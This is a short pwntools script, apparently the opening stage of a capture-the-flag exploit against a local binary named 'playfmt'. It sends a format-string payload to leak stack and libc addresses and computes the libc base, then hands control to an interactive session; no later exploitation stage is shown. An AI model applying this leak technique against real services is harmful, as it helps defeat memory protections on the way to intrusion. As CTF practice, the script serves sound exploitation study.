#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]


io = process("./playfmt")
elf = ELF("./playfmt")
libc = elf.libc

def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

#  DEBUG("b *0x804853B\n/c")
io.send("||%6$p||%8$p||")
io.recvuntil("||")
playEbp = int(io.recvuntil("||", drop = True), 16)
do_fmtEbp = playEbp - 0x10
success("playEbp -> {:#x}".format(playEbp))
success("do_fmtEbp -> {:#x}".format(do_fmtEbp))
libcBase = int(io.recvuntil("||", drop = True), 16) - libc.sym['_IO_2_1_stdout_']
success("libcBase -> {:#x}".format(libcBase))

io.interactive()
io.close()
